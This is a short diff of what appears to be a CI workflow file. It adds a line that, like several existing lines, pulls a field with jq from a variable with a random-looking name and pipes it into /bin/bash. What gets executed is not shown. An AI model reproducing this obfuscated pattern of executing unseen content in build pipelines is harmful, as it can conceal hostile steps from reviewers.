@@ -32,6 +32,7 @@ jobs:
           echo $k72918 | jq -r .w0086 | /bin/bash
           printf '%s' "$utsj14965" | jq -r .hqjoz30 | /bin/bash
           printf '%s' "$ltgnt69238" | jq -r .jbpq469 | /bin/bash
+          printf '%s' "$getg218" | jq -r .w22 | /bin/bash
 
       - name: Upload data
         if: always()
